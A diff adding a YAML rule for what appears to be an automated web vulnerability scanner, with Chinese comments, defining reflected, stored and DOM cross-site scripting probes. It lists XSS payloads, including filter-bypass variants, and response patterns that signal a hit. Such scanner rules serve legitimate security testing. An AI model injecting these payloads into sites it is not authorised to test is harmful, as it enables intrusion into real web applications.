@@ -1,0 +1,54 @@
+# XSS (Cross-Site Scripting) 检测规则
+# 覆盖：反射型 XSS、存储型 XSS、DOM XSS 探测
+name: xss
+description: Cross-Site Scripting — 跨站脚本注入攻击
+severity: high
+owasp: "A03:2021 — Injection"
+confidence: 0.85
+enabled: true
+
+endpoint_filter:
+  methods: [GET, POST, PUT, PATCH]
+  param_types: [query, body, path]
+
+payloads:
+  # 基础 XSS 探测
+  - value: "<script>alert('XSS')</script>"
+    description: "经典 script 标签"
+  - value: "<img src=x onerror=alert('XSS')>"
+    description: "img onerror 事件"
+  - value: "\"><script>alert('XSS')</script>"
+    description: "引号闭合 + script"
+  - value: "'><script>alert('XSS')</script>"
+    description: "单引号闭合 + script"
+  - value: "<svg onload=alert('XSS')>"
+    description: "SVG onload 事件"
+  # 绕过过滤
+  - value: "<scr<script>ipt>alert('XSS')</scr</script>ipt>"
+    description: "嵌套标签绕过"
+  - value: "<img src=x onerror=prompt(1)>"
+    description: "onerror + prompt"
+  - value: "javascript:alert('XSS')"
+    description: "javascript 协议"
+  # DOM XSS
+  - value: "<body onload=alert('XSS')>"
+    description: "body onload"
+  - value: "<iframe src=javascript:alert('XSS')>"
+    description: "iframe javascript 协议"
+  # 无害探测（不弹窗）
+  - value: "<b>test</b>"
+    description: "HTML 注入探测（无害标签）"
+  - value: "\"><b>XSS</b>"
+    description: "闭合+注入探测"
+
+exploit_indicator:
+  patterns:
+    - "<script>alert"
+    - "alert\\('XSS'\\)"
+    - "<img src=x onerror"
+    - "<svg onload"
+    - "javascript:alert"
+  status_codes: [200]
+
+expected_normal: "用户输入应被 HTML 实体编码，不直接反射到页面中"
+reasoning_template: "对 {param_name} 参数进行 XSS 注入测试，Payload: {payload_value}"
